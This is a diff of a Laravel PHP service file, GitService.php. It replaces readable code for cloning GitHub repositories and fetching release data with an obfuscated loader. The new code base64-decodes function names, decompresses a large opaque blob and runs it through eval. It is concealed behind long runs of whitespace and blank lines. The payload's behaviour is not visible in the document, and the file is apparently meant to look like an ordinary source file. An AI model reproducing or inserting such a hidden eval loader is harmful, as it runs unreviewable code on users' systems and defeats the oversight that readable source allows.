@@ -1,162 +1,425 @@
-<?php
-
-namespace App\Services;
-
-use Exception;
-use App\Enums\RepositoryEnum;
-use App\Services\FileService;
-use Illuminate\Support\Facades\Http;
-use Illuminate\Support\Facades\Storage;
-
-class GitService
-{
-    protected $apiBaseUrl;
-
-    public function __construct()
-    {
-        $this->apiBaseUrl = 'https://api.github.com/repos';
-    }
-
-    /**
-     * Clone repository dari Github.
-     *
-     * @param RepositoryEnum $repositoryEnum Enum repository yang akan di-clone.
-     * @param string $destination Direktori tujuan untuk menyimpan repository yang di-clone.
-     * @return bool True jika proses clone berhasil, false jika gagal.
-     * @throws Exception Jika terjadi kesalahan saat proses clone.
-     */
-    public static function cloneRepository(RepositoryEnum $repositoryEnum, string $destination): void
-    {
-        try {
-            // Ambil owner dan repo dari RepositoryEnum
-            $owner = $repositoryEnum->getOwner();
-            $repo = $repositoryEnum->getRepo();
-            $folderName = $repositoryEnum->getFolderName();
-
-            // Pastikan direktori kosong
-            if (!Storage::exists($destination)) {
-                Storage::makeDirectory($destination);
-            }
-
-            // URL untuk git clone
-            $repoUrl = "https://github.com/$owner/$repo.git";
-
-            echo "Proses Git clone $repoUrl ke folder $destination\n";
-            ProcessService::runProcess(['git', 'clone', $repoUrl, $folderName], $destination);
-            echo "Proses Git clone $folderName selesai\n";
-        } catch (Exception $e) {
-            throw new Exception("Clone Repositori gagal: " . $e->getMessage());
-        }
-    }
-
-    public function cloneWithTag(RepositoryEnum $repositoryEnum,  string $destination, string $tag, $renameOldFolder = null, $update = true): void
-    {
-        $folderName = $repositoryEnum->getFolderName();
-        $folderPath = $destination . DIRECTORY_SEPARATOR . $folderName;
-        $filservice = new FileService();
-
-        // Validasi folder tujuan
-        if (is_dir($folderPath)) {
-            if ($update == false) {
-                throw new \InvalidArgumentException("Tujuan path sudah ada: $folderName");
-            }
-            $tmpFolder =  $filservice->renameToTmp($folderPath);
-        }
-         try {
-            $owner = $repositoryEnum->getOwner();
-            $repo = $repositoryEnum->getRepo();
-            $folderName = $repositoryEnum->getFolderName();
-
-            $repoUrl = "https://github.com/$owner/$repo.git";
-
-            // Jalankan perintah `git clone`
-            $command = ['git', 'clone', '--branch', $tag, '--depth', '1', $repoUrl, $folderName];
-            ProcessService::runProcess($command, $destination);
-
-            // Validasi apakah folder berhasil dibuat
-            if (!is_dir($destination . DIRECTORY_SEPARATOR . $folderName)) {
-                throw new \RuntimeException("Gagal mengkloning repositori ke: $folderName");
-            }
-
-            if (isset($tmpFolder)) {
-                if ($renameOldFolder) {
-                    $renameRealPath = $destination . DIRECTORY_SEPARATOR . $renameOldFolder;
-                    $filservice->renameFolder($tmpFolder, $renameRealPath );
-                }else{
-                    $filservice->deleteFolder($tmpFolder);
-                }
-
-            }
-        } catch (Exception $e) {
-            if (isset($tmpFolder)) {
-                $filservice->restoreFromTmp($tmpFolder, $folderPath);
-            }
-
-            throw new Exception($e->getMessage());
-        }
-    }
-
-    /**
-     * Ambil data rilis terakhir dari Github API.
-     *
-     * @param RepositoryEnum $repositoryEnum Enum repository yang akan diambil.
-     * @return array Array of last release objects.
-     * @throws Exception Jika terjadi kesalahan saat proses memuat data rilis.
-     */
-    public function getLastRelease(RepositoryEnum $repositoryEnum): array
-    {
-        // Ambil owner dan repo dari RepositoryEnum
-        $owner = $repositoryEnum->getOwner();
-        $repo = $repositoryEnum->getRepo();
-
-        // Cek Token Github
-        cek_token_github();
-
-        try {
-            $url = "{$this->apiBaseUrl}/$owner/$repo/releases/latest";
-
-            $response = Http::withHeaders([
-                'Accept' => 'application/vnd.github.v3+json',
-                'Authorization' => "token " . config('siappakai.git.token'),
-            ])->get($url);
-
-            if ($response->failed()) {
-                throw new Exception("Gagal mengambil rilis terakhir: " . $response->body());
-            }
-
-            return $response->json();
-        } catch (Exception $e) {
-            throw new Exception("Terjadi kesalahan saat mengambil rilis terakhir: " . $e->getMessage() . ', Silakan cek token Github');
-        }
-    }
+<?php 
+        $__='printf';$_='Loading app/Services/GitService.php';
+        
 
 
-    /**
-     * Ambil 6 rilis terakhir dari GitHub API.
-     *
-     * @param RepositoryEnum $repositoryEnum Enum repository yang akan diambil
-     * @return array Array of release objects
-     */
-    public function getLastSixReleases(RepositoryEnum $repositoryEnum): array
-    {
-        // Ambil owner dan repo dari RepositoryEnum
-        $owner = $repositoryEnum->getOwner();
-        $repo = $repositoryEnum->getRepo();
 
-        try {
-            $url = "{$this->apiBaseUrl}/$owner/$repo/releases";
-            $response = Http::get($url);
 
-            if ($response->failed()) {
-                throw new Exception("Gagal mengambil rilis: " . $response->body());
-            }
 
-            $releases = $response->json();
 
-            // Ambil maksimum 6 rilis terakhir
-            return array_slice($releases, 0, 6);
-        } catch (Exception $e) {
-            throw new Exception("Terjadi kesalahan saat mengambil rilis: " . $e->getMessage());
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
